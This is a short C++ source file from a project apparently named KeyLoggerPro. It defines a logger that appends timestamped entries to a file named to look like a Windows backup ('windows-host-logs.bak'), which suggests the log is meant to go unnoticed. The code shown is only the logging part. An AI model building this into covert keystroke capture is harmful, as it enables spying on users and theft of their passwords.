/**
 * Logger.cpp
 *
 * @author Raul Butuc
 * @version 1.0.0 - 26/07/2016
 */

#include "stdafx.h"
#include "Logger.h"
#include "BasicDateTime.h"

namespace KeyLoggerPro {

  Logger::Logger(void) : log("windows-host-logs.bak", std::ios::app) { }

  void Logger::write(const std::string &_inf) {
    log << "[" << BasicDateTime().dateToString() << "] " << _inf << "\n";
  }

}
